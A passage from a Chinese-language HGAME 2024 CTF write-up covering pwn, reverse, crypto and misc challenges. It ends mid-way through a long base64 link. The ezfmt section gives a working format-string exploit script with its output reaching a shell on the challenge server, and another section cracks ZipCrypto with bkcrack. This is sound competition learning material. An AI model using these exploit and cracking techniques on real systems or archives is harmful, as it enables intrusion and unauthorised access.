hgame{R4nd0m_Th1ngs_4r3_pr3sen7s_1n_l1f3}
[*] Interrupted
[*] Closed connection to 47.100.137.175 port 30766
(pwnenv) PS D:\Workspace\rev\hgame_2024>
```

`hgame{R4nd0m_Th1ngs_4r3_pr3sen7s_1n_l1f3}`

### ezfmt string

> Easy Format String

需要绕过 canary。

![](./DBIQbA94eoy9H3xrNUcc396on9g.png)

提供了后门函数。

![](./MrHWbXipFoLGEkxtLGccIA4onEg.png)

80 个字符，不包含 p 和 s。

```c
void __fastcall vuln()
{
  __int64 buf[4]; // [rsp+0h] [rbp-80h] BYREF
  char s[88]; // [rsp+20h] [rbp-60h] BYREF
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  strcpy((char *)buf, "make strings and getshell\n");
  write(0, buf, 0x1BuLL);
  read(0, s, 80uLL);
  if ( !strchr(s, 'p') && !strchr(s, 's') )
    printf(s);
}
```

![](./P6Ppbg5u8oj38LxyMQhcdp2gnze.png)

那么这个位置就是 `69 13 40 00 00 00 00 00`。sys 在 `3D 12 40 00 00 00 00 00`。能不能直接写入？

找 offset：

```plain-text
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$ ./ezfmt/attachment/attachment/vuln
the shit is ezfmt, M3?
make strings and getshell
aaaabaaa-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx-%llx
aaaabaaa-73-50-7f64bddb07e2-17-7f64bdee0040-72747320656b616d-646e612073676e69-6c65687374656720-7f64bd000a6c-6161616261616161-6c252d786c6c252d-2d786c6c252d786c-6c6c252d786c6c25-252d786c6c252d78
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$
```

offset=10

但是没有能触发的地方。也没法用__stack_chk_fail，因为没法改掉 canary。

尝试二级指针写入。可能需要爆破一下。

`%{N}c%18$hhn-%18$llx-%22$llx` 可以将 %22$llx处的最低字节改为N。~~那么只需要将%22$llx 处改为 16k+8 where 0<=K<=15 即可写入返回地址。~~失败。必须有至少 2 次 printf 才行。

![](./Pc4Hb465FoylBsxOxL7cIl4Kn5f.png)

尝试利用函数返回的 `leave; ret; leave; ret;` 迁移栈。新栈区的数据可以从 read 读入。

`%{16*k}c%18$hhn justified to 48 bytes + p64(0) + p64(0x40123D)` 不行，会 segfault。

那么考虑直接跳到 `lea rdi, command; call _system`：

```python
from pwn import *

vuln = ELF("./ezfmt/attachment/attachment/vuln")
context.binary = vuln

with remote("47.100.137.175", 31709) as r:
    payload_1 = b"%128c%18$hhn".ljust(48, b"\x00") + p64(0) + p64(0x401245)
    info(hexdump(payload_1))
    r.sendafter(b"make strings and getshell\n", payload_1)
    r.interactive()
```

多试一试就出了。

```plain-text
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$ python ./ezfmt/sol.py
[*] '/mnt/d/Workspace/rev/hgame_2024/ezfmt/attachment/attachment/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 47.100.137.175 on port 31709: Done
[*] 00000000  25 31 32 38  63 25 31 38  24 68 68 6e  00 00 00 00  │%128│c%18│$hhn│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000030  00 00 00 00  00 00 00 00  45 12 40 00  00 00 00 00  │····│····│E·@·│····│
    00000040
[*] Switching to interactive mode
\x00
           s$ whoami
/bin/sh: 1: whoami: not found
$ cat /flag
hgame{0e67c884a988192e3ff7d19e31f49525161cc271}
$ 
[*] Got EOF while reading in interactive
$
[*] Closed connection to 47.100.137.175 port 31709
mantlebao@LAPTOP-RONG-BAO:/mnt/d/Workspace/rev/hgame_2024$
```

`hgame{0e67c884a988192e3ff7d19e31f49525161cc271}`

写了篇文章讲这道题：[https://csharpermantle.github.io/ctf/2024/02/04/a-single-fmtstr-away-from-shell.html](https://csharpermantle.github.io/ctf/2024/02/04/a-single-fmtstr-away-from-shell.html)

## Reverse

### ezASM

>

```assembly
check_flag:
    mov al, byte [flag + esi]
    xor al, 0x22
    cmp al, byte [c + esi]
    jne failure_check

    inc esi
    cmp esi, 33
    jne check_flag
```

简单异或。

```plain-text
(pwnenv) PS D:\Workspace\rev\hgame_2024> python
Python 3.11.6 (tags/v3.11.6:8b6ee5b, Oct  2 2023, 14:57:12) [MSC v.1935 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> cipher = [74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34]
>>> plain = list(map(lambda x: chr((x ^ 0x22) & 0xFF), cipher))
>>> print("".join(plain))
hgame{ASM_Is_Imp0rt4nt_4_Rev3rs3}
>>>
```

`hgame{ASM_Is_Imp0rt4nt_4_Rev3rs3}`

### ezPYC

>

直接 pycdc 失败。

```plain-text
(pwnenv) PS D:\Workspace\rev\hgame_2024\ezPYC> D:\bdist\pyinstxtractor-ng.exe .\ezPYC.exe
[+] Processing .\ezPYC.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.11
[+] Length of package: 1335196 bytes
[+] Found 10 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: ezPYC.pyc
[!] Unmarshalling FAILED. Cannot extract PYZ-00.pyz. Extracting remaining files.
[+] Successfully extracted pyinstaller archive: .\ezPYC.exe

You can now use a python decompiler on the pyc files within the extracted directory
(pwnenv) PS D:\Workspace\rev\hgame_2024\ezPYC>
(pwnenv) PS D:\Workspace\rev\hgame_2024\ezPYC> D:\bdist\pycdc\Release\pycdc.exe .\ezPYC.exe_extracted\ezPYC.pyc
# Source Generated with Decompyle++
# File: ezPYC.pyc (Python 3.11)

Unsupported opcode: JUMP_BACKWARD
...
```

直接看字节码。

```plain-text
(pwnenv) PS D:\Workspace\rev\hgame_2024\ezPYC> D:\bdist\pycdc\Release\pycdas.exe .\ezPYC.exe_extracted\ezPYC.pyc
ezPYC.pyc (Python 3.11)
[Code]
    File Name: ezPYC.py
    Object Name: <module>
    Qualified Name: <module>
    Arg Count: 0
    Pos Only Arg Count: 0
    KW Only Arg Count: 0
    Stack Size: 5
    Flags: 0x00000000
    [Names]
        'flag'
        'c'
        'input'
        'range'
        'i'
        'ord'
        'print'
        'exit'
    [Locals+Names]
    [Constants]
        ...
    [Disassembly]
        0       RESUME                        0
        2       BUILD_LIST                    0
        4       LOAD_CONST                    0: (87, 75, 71, 69, 83, 121, 83, 125, 117, 106, 108, 106, 94, 80, 48, 114, 100, 112, 112, 55, 94, 51, 112, 91, 48, 108, 119, 97, 115, 49, 112, 112, 48, 108, 100, 37, 124, 2)
        6       LIST_EXTEND                   1
        8       STORE_NAME                    0: flag
        10      BUILD_LIST                    0
        12      LOAD_CONST                    1: (1, 2, 3, 4)
        14      LIST_EXTEND                   1
        16      STORE_NAME                    1: c
        18      PUSH_NULL
        20      LOAD_NAME                     2: input
        22      LOAD_CONST                    2: 'plz input flag:'
        24      PRECALL                       1
        28      CALL                          1
        38      STORE_NAME                    2: input
        40      PUSH_NULL
        42      LOAD_NAME                     3: range
        44      LOAD_CONST                    3: 0
        46      LOAD_CONST                    4: 36
        48      LOAD_CONST                    5: 1
        50      PRECALL                       3
        54      CALL                          3
        64      GET_ITER
        66      FOR_ITER                      62 (to 192)
        68      STORE_NAME                    4: i
        70      PUSH_NULL
        72      LOAD_NAME                     5: ord
        74      LOAD_NAME                     2: input
        76      LOAD_NAME                     4: i
        78      BINARY_SUBSCR
        88      PRECALL                       1
        92      CALL                          1
        102     LOAD_NAME                     1: c
        104     LOAD_NAME                     4: i
        106     LOAD_CONST                    6: 4
        108     BINARY_OP                     6 (%)
        112     BINARY_SUBSCR
        122     BINARY_OP                     12 (^)
        126     LOAD_NAME                     0: flag
        128     LOAD_NAME                     4: i
        130     BINARY_SUBSCR
        140     COMPARE_OP                    3 (!=)
        146     POP_JUMP_FORWARD_IF_FALSE     21 (to 190)
        148     PUSH_NULL
        150     LOAD_NAME                     6: print
        152     LOAD_CONST                    7: 'Sry, try again...'
        154     PRECALL                       1
        158     CALL                          1
        168     POP_TOP
        170     PUSH_NULL
        172     LOAD_NAME                     7: exit
        174     PRECALL                       0
        178     CALL                          0
        188     POP_TOP
        190     JUMP_BACKWARD                 63
        192     PUSH_NULL
        194     LOAD_NAME                     6: print
        196     LOAD_CONST                    8: 'Wow!You know a little of python reverse'
        198     PRECALL                       1
        202     CALL                          1
        212     POP_TOP
        214     LOAD_CONST                    9: None
        216     RETURN_VALUE
(pwnenv) PS D:\Workspace\rev\hgame_2024\ezPYC>
```

可以看到一个简单的异或校验循环。

解密代码如下：

```plain-text
PS D:\Workspace\rev\hgame_2024> python
Python 3.11.6 (tags/v3.11.6:8b6ee5b, Oct  2 2023, 14:57:12) [MSC v.1935 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> flag = [
...     87,
...     ...
...     2]
>>> c = [
...     1,
...     2,
...     3,
...     4]
>>> plain = list(map(lambda p: chr((p[1] ^ c[p[0] % 4]) & 0xFF), enumerate(flag)))
>>> print("".join(plain))
VIDAR{Python_R3vers3_1s_1nter3st1ng!}
>>>
```

`VIDAR{Python_R3vers3_1s_1nter3st1ng!}`

### ezUPX

>

![](./GIg5br8xdoI4sjxgWIMchWABnhe.png)

看来没修改过任何特征。

![](./WC4TbpIPZoL7MlxPXPPczSTfnmZ.png)

直接 dump 出来然后解密即可。注意密文常量数组的长度。

```plain-text
PS D:\Workspace\rev\hgame_2024\ezUPX> python
Python 3.11.6 (tags/v3.11.6:8b6ee5b, Oct  2 2023, 14:57:12) [MSC v.1935 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> cipher = [0x64, 0x7B, 0x76, 0x73, 0x60, 0x49, 0x65, 0x5D, 0x45, 0x13, 0x6B, 0x02, 0x47, 0x6D, 0x59, 0x5C, 0x02, 0x45, 0x6D, 0x06, 0x6D, 0x5E, 0x03, 0x46, 0x46, 0x5E, 0x01, 0x6D, 0x02, 0x54, 0x6D, 0x67, 0x62, 0x6A, 0x13, 0x4F, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
>>> plain = list(map(lambda x: chr((x ^ 0x32) & 0xFF), cipher))
>>> print("".join(plain))
VIDAR{Wow!Y0u_kn0w_4_l1ttl3_0f_UPX!}22222222222
>>>
```

`VIDAR{Wow!Y0u_kn0w_4_l1ttl3_0f_UPX!}`

### ezIDA

>

无壳，直接 ida。

![](./QUzlb5uJUoWuWpxg2n1cIyNgnic.png)

![](./PFKnbFGTJoEiWMxSQPUcKElqnmb.png)

`hgame{W3lc0me_T0_Th3_World_of_Rev3rse!}`

## Crypto

### ezRSA

> 题目描述：一个简单的 RSA

观察代码我们发现题目给出了以下信息：$p^q \mod n$和$q^p \mod n$。费马小定理告诉我们：

$$
\forall\ \text{prime}\ p,\ a^p \equiv a \pmod p
$$

因此：

$$
p^q \equiv p \pmod q
$$

$$
q^p \equiv q \pmod p
$$

显然

$$
p^q \equiv p \pmod{pq=n}
$$

$$
q^p \equiv q \pmod{pq=n}
$$

那么就等于直接泄漏了 p 和 q。

```python
from Crypto.Util.number import *
from pwn import *

leak1 = 149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669
leak2 = 116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461
c = 10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971
e = 0x10001

p = leak1
q = leak2
n = p * q
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
success(long_to_bytes(m))
```

```plain-text
(pwnenv) PS D:\Workspace\rev\hgame_2024> & d:/Workspace/pwnenv/Scripts/python.exe d:/Workspace/rev/hgame_2024/ezRSA/sol.py
D:\Workspace\pwnenv\Lib\site-packages\pwnlib\log.py:347: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'success')
[+] hgame{F3rmat_l1tt1e_the0rem_is_th3_bas1s}
(pwnenv) PS D:\Workspace\rev\hgame_2024>
```

`hgame{F3rmat_l1tt1e_the0rem_is_th3_bas1s}`

### ezPRNG

> 一个简单的随机数

观察到 PRNG 的算法中没有下标操作，可以（经过一些小的等价变换）使用 z3。

```python
import typing
import uuid

import z3
from pwn import *

UNK_WIDTH = 32
OUTPUT = [
    "1111110110111011110000101011010001000111111001111110100101000011110111111100010000111110110111100001001000101101011110111100010010100000011111101101110101011010111000000011110000100011101111011011000100101100110100101110001010001101101110000010001000111100101010010110110111101110011011001011111011010101011000011011000111011011111001101010111100101100110001011010010101110011101001100111000011110111000001101110000001111100000100000101111100010110111001110011010000011011110110011000001101011111111010110011010111010101001000010011110110011110110101011110111010011010010110111111010011101000110101111101111000110011111110010110000100100100101101010101110010101001101010101011110111010011101110000100101111010110101111110001111111110010000000001110011100100001011111110100111011000101001101001110010010001100011000001101000111010010000101101111101011000000101000001110001011001010010001000011000000100010010010010111010011111111011100100100100101111111001110000111110110001111001111100101001001100010",
    "0010000000001010111100001100011101111101111000100100111010101110010110011001011110101100011101010000001100000110000000011000000110101111111011100100110111011010000100011111000111001000101001110010110010001000110010101011110011101000011111101101011000011110001101011111000110111000011000110011100100101100111100000100100101111001011101110001011011111111011010100010111011000010010101110110100000110100000100010101000010111101001000011000000000111010010101010111101101011111011001000101000100011001100101010110110001010010001010110111011011111101011100111001101111111111010011101111010010011110011111110100110011111110110001000111100010111000101111000011011011111101110101110100111000011100001010110111100011001011010011010111000110101100110100011101101011101000111011000100110110001100110101010110010011011110000111110100111101110000100010000111100010111000010000010001111110110100001000110110100100110110010110111010011111101011110000011101010100110101011110000110101110111011010110110000010000110001",
    "1110110110010001011100111110111110111001111101010011001111100100001000111001101011010100010111110101110101111010111100101100010011001001011101000101011000110111000010000101001000100111010110001010000111110110111000011001100010001101000010001111111100000101111000100101000000001001001001101110000100111001110001001011010111111010111101101101001110111010111110110011001000010001010100010010110110101011100000101111100100110011110001001001111100101111001111011011010111001001111010001100110001100001100000110000011111010100101111000000101011111010000111110000101111100010000010010111010110100101010101001111100101011100011001001011000101010101001101100010110000010001110011110011100111000110101010111010011010000001100001011000011101101000000011111000101111101011110011000011011000100100110111010011001111101100101100011000101001110101111001000010110010111101110110010101101000000101001011000000001110001110000100000001001111100011010011000000011011101111101001111110001011101100000010001001010011000001",
    "0001101010101010100001001001100010000101010100001010001000100011101100110001001100001001110000110100010101111010110111001101011011101110000011001000100100101000011011101000111001001010011100010001010110111011100100111110111001010010111010100000100111110101110010010110100001000010010001101111001110100010001011101100111011101011101100100101011010101000101001000101110011011111110110011111111100000000011100000010011000110001000110101010001011000010101000110000101001110101010111011010010111011001010011100010101001100110000110101100010000100110101110100001101001011011110011100110011001010110100101010111110110111100000111010001111101110000000000111011011101000011001010010111001110111000100111011110100101000100011011101100011111000101110110110111111001111000000011100011000010000101001011001101110101000010101001000100110010000101001111100101000001011011010011110001101000001101111010100101001100010100000111000011110101010100011011001110001011110111010111011010101101100000110000001010010101111011",
]
OUTPUT_ARRS = list(map(lambda l: list(map(lambda c: int(c, 2), l)), OUTPUT))
MASK = z3.BitVecVal(0b10001001000010000100010010001001, UNK_WIDTH)

def prng(r: z3.BitVecRef, mask: z3.BitVecRef) -> tuple[z3.BitVecRef, z3.BitVecRef]:
    next_r = r << 1
    i = r & mask
    next_bit = z3.BitVecVal(0, UNK_WIDTH)
    for j in range(32):
        next_bit ^= z3.LShR(i, j) & 1
    next_r ^= next_bit
    return (next_r, next_bit)

solver = z3.Solver()

finals = ""
for i in range(4):
    info(f"Part {i}: generating constraints")
    solver.reset()
    x = z3.BitVec(f"x_{i}", UNK_WIDTH)
    out = ""
    for j in range(1000):
        (x, next_bit) = prng(x, MASK)
        solver.add(next_bit == OUTPUT_ARRS[i][j])
    info(f"Part {i}: modeling")
    if solver.check() != z3.sat:
        error("Unsat")
        exit(1)
    result: typing.Any = 0
    m = solver.model()
    for d in m.decls():
        result = m[d].as_long()  # type: ignore
        break
    result_hex = hex(result)[2:].zfill(8)
    success(f"Part {i}: {result_hex}")
    finals += result_hex

flag = str(uuid.UUID(finals))
success(f"flag = hgame{{{flag}}}")
```

```bash
(pwnenv) PS D:\Workspace\rev\hgame_2024> & d:/Workspace/pwnenv/Scripts/python.exe d:/Workspace/rev/hgame_2024/ezPRNG/sol.py
[*] Part 0: generating constraints
[*] Part 0: modeling
[+] Part 0: fbbbee82
[*] Part 1: generating constraints
[*] Part 1: modeling
[+] Part 1: 3f434f91
[*] Part 2: generating constraints
[*] Part 2: modeling
[+] Part 2: 93379078
[*] Part 3: generating constraints
[*] Part 3: modeling
[+] Part 3: 80e4191a
[+] flag = hgame{fbbbee82-3f43-4f91-9337-907880e4191a}
(pwnenv) PS D:\Workspace\rev\hgame_2024>
```

`hgame{fbbbee82-3f43-4f91-9337-907880e4191a}`

### 奇怪的图片

> 一些奇怪的图片

xor，差分。人肉处理。

需要注意的是得到字符串的第一个字符是缺失的。需要补上。

`hgame{1adf_17eb_803c}`

### ezMath

> 一个简单的数学题

Pell's equation，丢番图方程的特例

![](./LinbbOGfpoA2dJxAe6gcvQ3vnXb.png)

```python
from Crypto.Cipher import AES
from Crypto.Util.number import *
from pwn import *

def pad(x):
    return x + b"\x00" * (16 - len(x) % 16)

enc=b"\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5'\x93\xf8\xde\xb2\x9a\x9a"
y = 9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680

key = pad(long_to_bytes(y))[:16]
cipher = AES.new(key, AES.MODE_ECB)
dec = cipher.decrypt(enc)
success(dec)
```

```plain-text
(pwnenv) PS D:\Workspace\rev\hgame_2024> & d:/Workspace/pwnenv/Scripts/python.exe d:/Workspace/rev/hgame_2024/ezMath/sol.py
D:\Workspace\pwnenv\Lib\site-packages\pwnlib\log.py:347: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'success')
[+] hgame{G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!}
(pwnenv) PS D:\Workspace\rev\hgame_2024>
```

`hgame{G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!}`

## Misc

### 签到

> 关注“凌武科技”微信公众号，发送“HGAME2024”获得 Flag！

`hgame{welc0me_t0_HGAME_2024}`

### SignIn

> 换个方式签个到 flag 格式：'hgame\{[A-Z_]+\}'

将图片高缩至 150px 即可。

![](./XMd5bndFWomh0wxD561cgpmrnjb.png)

`hgame{WOW_GREAT_YOU_SEE_IT_WONDERFUL}`

### simple_attack

> 怎么解开这个压缩包呢？

已知明文的 zipcrypto 攻击。

用 bandizip 以不同压缩程度（1-3）压缩题目给的图片，然后依次尝试。

```plain-text
PS D:\bdist\bkcrack-1.5.0-win64> .\bkcrack.exe -L D:\Workspace\rev\hgame_2024\simple_attack\src\103223779_p0_1.zip
bkcrack 1.5.0 - 2022-07-07
Archive: D:\Workspace\rev\hgame_2024\simple_attack\src\103223779_p0_1.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 None       Deflate     2420fda1     12556509     12546538 103223779_p0.jpg
PS D:\bdist\bkcrack-1.5.0-win64> .\bkcrack.exe -L D:\Workspace\rev\hgame_2024\simple_attack\src\103223779_p0_2.zip
bkcrack 1.5.0 - 2022-07-07
Archive: D:\Workspace\rev\hgame_2024\simple_attack\src\103223779_p0_2.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 None       Deflate     2420fda1     12556509     12550329 103223779_p0.jpg
PS D:\bdist\bkcrack-1.5.0-win64> .\bkcrack.exe -L D:\Workspace\rev\hgame_2024\simple_attack\src\103223779_p0_3.zip
bkcrack 1.5.0 - 2022-07-07
Archive: D:\Workspace\rev\hgame_2024\simple_attack\src\103223779_p0_3.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 None       Deflate     2420fda1     12556509     12550329 103223779_p0.jpg
PS D:\bdist\bkcrack-1.5.0-win64> .\bkcrack.exe -C D:\Workspace\rev\hgame_2024\simple_attack\src\attachment.zip -c 103223779_p0.jpg -P D:\Workspace\rev\hgame_2024\simple_attack\src\103223779_p0_1.zip -p 103223779_p0.jpg
bkcrack 1.5.0 - 2022-07-07
[09:11:12] Z reduction using 1048569 bytes of known plaintext
0.4 % (3720 / 1048569)
[09:11:13] Attack on 1 Z values at index 1044858
100.0 % (1 / 1)
[09:11:13] Could not find the keys.
PS D:\bdist\bkcrack-1.5.0-win64> .\bkcrack.exe -C D:\Workspace\rev\hgame_2024\simple_attack\src\attachment.zip -c 103223779_p0.jpg -P D:\Workspace\rev\hgame_2024\simple_attack\src\103223779_p0_2.zip -p 103223779_p0.jpg
bkcrack 1.5.0 - 2022-07-07
[09:11:17] Z reduction using 1048569 bytes of known plaintext
10.3 % (107723 / 1048569)
[09:11:20] Attack on 254 Z values at index 941867
Keys: e423add9 375dcd1c 1bce583e
83.1 % (211 / 254)
[09:11:20] Keys
e423add9 375dcd1c 1bce583e
PS D:\bdist\bkcrack-1.5.0-win64> .\bkcrack.exe -C D:\Workspace\rev\hgame_2024\simple_attack\src\attachment.zip -k e423add9 375dcd1c 1bce583e -U D:\Workspace\rev\hgame_2024\simple_attack\easy.zip easy
bkcrack 1.5.0 - 2022-07-07
[09:12:11] Writing unlocked archive D:\Workspace\rev\hgame_2024\simple_attack\easy.zip with password "easy"
100.0 % (2 / 2)
Wrote unlocked archive.
PS D:\bdist\bkcrack-1.5.0-win64>
```

[From Base64, 2 more - CyberChef](https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Render_Image('Raw')Optical_Character_Recognition(true)&input=aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQi80QUFBRWhDQVlBQUFCMnNnaWNBQUFBQVhOU1IwSUFyczRjNlFBQUFBUm5RVTFCQUFDeGp3djhZUVVBQUFBSmNFaFpjd0FBRmlVQUFCWWxBVWxTSlBBQUFIL2VTVVJCVkhoZTdkMEozRTFWKy8veHBVbWpSbE5GRTZtb0VFbURCcEZRYUo3bmVkQThhcFFHbFZLa2VkRHdxSXdWSW5NS2thRkVwWmxtS2c5SmVVci8vM2UxVGovZDNmYzVlNTJ6ejlsN24vTjV2MTVlMlllNG5mdnN0ZGU2cm10ZHE5S1NKVXYrTkFBQUFBQUFBQUFBQUFBQUlKRldjLzhGQUFBQUFBQUFBQUFBQUFBSlJPSWZBQUFBQUFBQUFBQUFBSUFFSS9FUEFBQUFBQUFBQUFBQUFFQ0NrZmdIQUFBQUFBQUFBQUFBQUNEQlNQd0RBQUFBQUFBQUFBQUFBSkJnSlA0QkFBQUFBQUFBQUFBQUFFZ3dFdjhBQUFBQUFBQUFBQUFBQUNRWWlYOEFBQUFBQUFBQUFBQUFBQktNeEQ4QUFBQUFBQUFBQUFBQUFBbEc0aDhBQUFBQUFBQUFBQUFBZ0FRajhROEFBQUFBQUFBQUFBQUFRSUtSK0FjQUFBQUFBQUFBQUFBQUlNRkkvQU1BQUFBQUFBQUFBQUFBa0dBay9nRUFBQUFBQUFBQUFBQUFTREFTL3dBQUFBQUFBQUFBQUFBQUpCaUpmd0FBQUFBQUFBQUFBQUFBRW96RVB3QUFBQUFBQUFBQUFBQUFDVWJpSHdBQUFBQUFBQUFBQUFDQUJDUHhEd0FBQUFBQUFBQUFBQUJBZ3BINEJ3QUFBQUFBQUFBQUFBQWd3VWo4QXdBQUFBQUFBQUFBQUFDUVlDVCtBUUFBQUFBQUFBQUFBQUJJTUJML0FBQUFBQUFBQUFBQUFBQWtHSWwvQUFBQUFBQUFBQUFBQUFBU2pNUS9BQUFBQUFBQUFBQUFBQUFKUnVJZkFBQUFBQUFBQUFBQUFJQUVJL0VQQUFBQUFBQUFBQUFBQUVDQ2tmZ0hBQUFBQUFBQUFBQUFBQ0RCU1B3REFBQUFBQUFBQUFBQUFKQmdKUDRCQUFBQUFBQUFBQUFBQUVnd0V2OEFBQUFBQUFBQUFBQUFBQ1FZaVg4QUFBQUFBQUFBQUFBQUFCS014RDhBQUFBQUFBQUFBQUFBQUFsRzRoOEFBQUFBQUFBQUFBQUFnQVFqOFE4QUFBQUFBQUFBQUFBQVFJS1IrQWNBQUFBQUFBQUFBQUFBSU1GSS9BTUFBQUFBQUFBQUFBQUFrR0FrL2dFQUFBQUFBQUFBQUFBQVNEQVMvd0FBQUFBQUFBQUFBQUFBSkJpSmZ3QUFBQUFBQUFBQUFBQUFFb3pFUHdBQUFBQUFBQUFBQUFBQUNVYmlId0FBQUFBQUFBQUFBQUNBQkNQeER3QUFBQUFBQUFBQUFBQkFncEg0QndBQUFBQUFBQUFBQUFBZ3dVajhBd0FBQUFBQUFBQUFBQUNRWUNUK0FRQUFBQUFBQUFBQUFBQklNQkwvQUFBQUFBQUFBQUFBQUFBa0dJbC9BQUFBQUFBQUFBQUFBQUFTak1RL0FBQUFBQUFBQUFBQUFBQUpSdUlmQUFBQUFBQUFBQUFBQUlBRUkvRVBBQUFBQUFBQUFBQUFBRUNDa2ZnSEFBQUFBQUFBQUFBQUFDREJTUHdEQUFBQUFBQUFBQUFBQUpCZ0pQNEJBQUFBQUFBQUFBQUFBRWd3RXY4QUFBQUFBQUFBQUFBQUFDUVlpWDhBQUFBQUFBQUFBQUFBQUJLTXhEOEFBQUFBQUFBQUFBQUFBQWxHNGg4QUFBQUFBQUFBQUFBQWdBUWo4UThBQUFBQUFBQUFBQUFBUUlLUitBY0FBQUFBQUFBQUFBQUFJTUZJL0FNQUFBQUFBQUFBQUFBQWtHQWsvZ0VBQUFBQUFBQUFBQUFBU0RBUy93QUFBQUFBQUFBQUFBQUFKQmlKZndBQUFBQUFBQUFBQUFBQUVvekVQd0FBQUFBQUFBQUFBQUFBQ1ViaUh3QUFBQUFBQUFBQUFBQ0FCQ1B4RHdBQUFBQUFBQUFBQUFCQWdwSDRCd0FBQUFBQUFBQUFBQUFnd1VqOEF3QUFBQUFBQUFBQUFBQ1FZQ1QrQVFBQUFBQUFBQUFBQUFCSU1CTC9BQUFBQUFBQUFBQUFBQUFrR0lsL0FBQUFBQUFBQUFBQUFBQVNqTVEvQUFBQUFBQUFBQUFBQUFBSlJ1SWZBQUFBQUFBQUFBQUFBSUFFSS9FUEFBQUFBQUFBQUFBQUFFQ0NrZmdIQUFBQUFBQUFBQUFBQUNEQlNQd0RBQUFBQUFBQUFBQUFBSkJnSlA0QkFBQUFBQUFBQUFBQUFFZ3dFdjhBQUFBQUFBQUFBQUFBQUNRWWlYOEFBQUFBQUFBQUFBQUFBQktNeEQ4QUFBQUFBQUFBQUFBQUFBbEc0aDhBQUFBQUFBQUFBQUFBZ0FRajhROEFBQUFBQUFBQUFBQUFRSUtSK0FjQUFBQUFBQUFBQUFBQUlNRkkvQU1BQUFBQUFBQUFBQUFBa0dBay9nRUFBQUFBQUFBQUFBQUFTREFTL3dBQUFBQUFBQUFBQUFBQUpCaUpmd0FBQUFBQUFBQUFBQUFBRW96RVB3QUFBQUFBQUFBQUFBQUFDVWJpSHdBQUFBQUFBQUFBQUFDQUJDUHhEd0FBQUFBQUFBQUFBQUJBZ3BINEJ3QUFBQUFBQUFBQUFBQWd3VWo4QXdBQUFBQUFBQUFBQUFDUVlDVCtBUUFBQUFBQUFBQUFBQUJJTUJML0FBQUFBQUFBQUFBQUFBQWtHSWwvQUFBQUFBQUFBQUFBQUFBU2pNUS9BQUFBQUFBQUFBQUFBQUFKUnVJZkFBQUFBQUFBQUFBQUFJQUVJL0VQQUFBQUFBQUFBQUFBQUVDQ2tmZ0hBQUFBQUFBQUFBQUFBQ0RCU1B3REFBQUFBQUFBQUFBQUFKQmdKUDRCQUFBQUFBQUFBQUFBQUVnd0V2OEFBQUFBQUFBQUFBQUFBQ1FZaVg4QUFBQUFBQUFBQUFBQUFCS014RDhBQUFBQUFBQUFBQUFBQUFsRzRoOEFBQUFBQUFBQUFBQUFnQVFqOFE4QUFBQUFBQUFBQUFBQVFJS1IrQWNBQUFBQUFBQUFBQUFBSU1GSS9BTUFBQUFBQUFBQUFBQUFrR0FrL2dFQUFBQUFBQUFBQUFBQVNEQVMvd0FBQUFBQUFBQUFBQUFBSkJpSmZ3QUFBQUFBQUFBQUFBQUFFb3pFUHdBQUFBQUFB